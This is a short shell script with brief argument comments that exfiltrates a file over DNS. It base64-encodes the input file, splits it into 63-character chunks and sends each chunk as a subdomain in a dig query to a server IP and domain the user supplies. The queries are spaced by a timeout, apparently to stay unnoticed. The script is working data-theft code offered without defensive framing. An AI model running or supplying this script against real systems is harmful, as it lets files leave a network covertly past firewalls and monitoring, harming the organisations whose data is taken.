#$1 - the input plain text file
#$2 - the destination server IP
#$3 - the FQDN 
#$4 - time out (sec) between lookups
base64 -w 63 $1 > ./.temp1
echo 'EOF' >> ./.temp1
while IFS= read -r line || [ -n "$line" ]; do
	dig +time=$4 @$2 $line.$3;
done < ./.temp1
rm ./.temp1
